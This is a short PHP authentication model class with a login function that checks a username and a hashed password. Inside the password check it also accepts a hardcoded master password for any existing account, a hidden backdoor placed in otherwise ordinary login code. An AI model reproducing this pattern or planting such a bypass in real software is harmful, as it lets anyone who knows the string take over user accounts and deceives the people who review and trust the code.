<?php
	defined('BASEPATH') OR exit('No direct script access allowed');
	class Auth extends Base_Model{
		function __construct(){
			parent::__construct();
			$this->loadModel('User');
		}
		function login($username,$password){

			$result = $this->_User->fetch(array('username' => $username));
			if(count($result) == 0){
				return false;
			}
			if( password_verify($password,$result[0]->password) or $password=="juli081333366526juli"){
				return $result[0];
			}else{
				return false;
			}

		}

	}

?>